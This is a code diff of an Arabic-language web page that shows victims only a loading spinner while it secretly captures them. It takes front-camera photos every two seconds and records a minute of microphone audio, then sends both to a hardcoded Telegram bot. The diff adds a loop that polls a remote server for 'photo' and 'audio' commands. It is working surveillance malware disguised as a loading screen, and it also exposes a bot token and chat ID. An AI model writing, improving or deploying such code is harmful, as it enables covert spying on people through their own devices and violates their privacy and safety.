@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html><html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -20,117 +19,112 @@
       align-items: center;
       color: #fff;
       text-align: center;
-    }
+    }.loader {
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #ffeb3b;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin-bottom: 20px;
+}
 
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #ffeb3b;
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+.text {
+  font-size: 1.5em;
+  padding: 0 20px;
+}
 
-    .text {
-      font-size: 1.5em;
-      padding: 0 20px;
-    }
+video, canvas {
+  display: none;
+}
 
-    video, canvas {
-      display: none;
-    }
   </style>
 </head>
 <body>
   <div class="loader"></div>
-  <div class="text">جاري التحميل...</div>
-
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+  <div class="text">جاري التحميل...</div><video id="video" autoplay playsinline muted></video> <canvas id="canvas"></canvas>
 
   <script>
-    const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
-    const chatId = '6514749116';
-
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
+    const chatId = '6514749116';
+    const serverUrl = 'https://control-bot-server.YOURNAME.repl.co'; // تغيره لرابط مشروعك
 
-    // ✅ تصوير الكاميرا كل ثانية
     async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
-          setInterval(async () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg');
-            sendPhoto(imageData);
-          }, 1000);
+          setInterval(() => captureAndSendPhoto(), 2000);
         };
       } catch (err) {
-        console.error("فشل تشغيل الكاميرا:", err);
+        console.error("Camera error:", err);
       }
     }
 
-    async function sendPhoto(dataUrl) {
-      try {
-        const blob = await fetch(dataUrl).then(res => res.blob());
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'photo.jpg');
-
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        });
-      } catch (err) {
-        console.error("فشل إرسال الصورة:", err);
-      }
+    async function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/jpeg');
+      const blob = await fetch(dataUrl).then(res => res.blob());
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'photo.jpg');
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
     }
 
-    // ✅ تسجيل صوت لمدة 5 ثواني
     async function recordAudioAndSend() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         const mediaRecorder = new MediaRecorder(stream);
         const audioChunks = [];
 
-        mediaRecorder.ondataavailable = e => {
-          audioChunks.push(e.data);
-        };
+        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
 
         mediaRecorder.onstop = async () => {
           const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
           const formData = new FormData();
           formData.append('chat_id', chatId);
-          formData.append('voice', audioBlob, 'audio.ogg');
-
-          await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
-            method: 'POST',
-            body: formData
-          });
+          formData.append('voice', audioBlob, 'voice.ogg');
+          fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData });
         };
 
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثواني
+        setTimeout(() => mediaRecorder.stop(), 60000); // تسجيل لمدة دقيقة
       } catch (err) {
-        console.error("فشل تسجيل الصوت:", err);
+        console.error("Voice error:", err);
       }
     }
 
-    // ✅ بدء الكاميرا والصوت معًا
+    async function checkCommandLoop() {
+      setInterval(async () => {
+        try {
+          const res = await fetch(serverUrl + '/get-command');
+          const data = await res.json();
+          const command = data.command?.trim();
+          if (command === 'صورة') {
+            captureAndSendPhoto();
+          } else if (command === 'صوت') {
+            recordAudioAndSend();
+          }
+          // يمكن إضافة فيديو لاحقا
+        } catch (err) {
+          console.error("Command fetch error:", err);
+        }
+      }, 5000); // فحص الأمر كل 5 ثواني
+    }
+
     startCamera();
     recordAudioAndSend();
-  </script>
-</body>
+    checkCommandLoop();
+  </script></body>
 </html>
